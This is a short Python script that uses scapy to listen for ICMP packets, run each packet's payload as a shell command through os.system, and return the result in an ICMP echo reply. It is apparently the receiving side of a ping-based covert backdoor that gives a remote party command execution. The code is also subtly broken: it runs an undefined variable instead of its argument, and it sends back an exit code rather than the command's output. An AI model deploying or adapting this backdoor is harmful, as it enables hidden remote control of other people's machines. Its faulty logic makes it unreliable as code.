#receiver windows
#!/usr/bin/python
import sys, os
from scapy.all import *

#useful cmds
#get_if_list()
#get ip -- listenip = get_if_addr("iface listed from get_iflist()")

#chow simple func
def shellfoo(pkt):
	if Raw in pkt[ICMP]:
		#keep original pkt values
		src = pkt[IP].src
		dst = pkt[IP].dst
		id = pkt[ICMP].id
		seq = pkt[ICMP].seq
		cmd = pkt[ICMP].payload
		def shellcmd(input):
			return os.system(payload)
		retsh = shellcmd(cmd)	
		resp = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/retsh
		send(resp)
	

sniff(iface="foo", prn=shellfoo, filter="icmp")
